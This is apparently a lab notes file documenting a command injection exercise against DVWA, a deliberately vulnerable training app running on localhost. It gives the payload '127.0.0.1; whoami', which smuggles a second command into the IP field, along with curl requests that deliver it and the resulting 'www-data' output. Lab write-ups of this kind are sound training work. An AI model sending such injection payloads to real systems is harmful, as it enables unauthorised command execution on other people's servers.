# Commands – DVWA Command Injection

## 1. Navigate to Lab Directory

```bash
cd ~/Alrazzaq_Labs/DVWA/02-Command-Injection
```

---

## 2. Verify Lab Files

```bash
ls -l
```

Expected structure:

```text
README.md
methodology.md
commands.md
findings.md
remediation.md
screenshots/
```

---

## 3. Test Normal Input

A normal IP address was used to establish baseline behavior:

```text
127.0.0.1
```

---

## 4. Command Injection Payload

A controlled payload was used to test whether additional commands could be executed:

```text
127.0.0.1; whoami
```

The `;` character separates the original input from the additional command.

---

## 5. Test Using Curl

The vulnerable endpoint was tested with `curl`:

```bash
curl -s \
  -H 'Cookie: PHPSESSID=<LAB_SESSION_ID>; security=low' \
  -d 'ip=127.0.0.1; whoami&Submit=Submit' \
  "http://localhost:8080/DVWA/vulnerabilities/exec/"
```

---

## 6. Filter the Response

To display the command execution result:

```bash
curl -s \
  -H 'Cookie: PHPSESSID=<LAB_SESSION_ID>; security=low' \
  -d 'ip=127.0.0.1; whoami&Submit=Submit' \
  "http://localhost:8080/DVWA/vulnerabilities/exec/" | grep -A 5 -B 5 'www-data'
```

### Output

```text
<pre>www-data
</pre>
```

---

## 7. Network Request Verification

The HTTP request was inspected to verify that the injected payload was transmitted to the vulnerable endpoint.

**HTTP Method:**

```text
POST
```

**Endpoint:**

```text
/DVWA/vulnerabilities/exec/
```

**Parameter:**

```text
ip=127.0.0.1; whoami
```

---

## 8. Result

The command:

```text
whoami
```

returned:

```text
www-data
```

This confirmed successful command execution in the controlled DVWA environment.

> **Note:** `<LAB_SESSION_ID>` is used instead of publishing an active PHP session token.
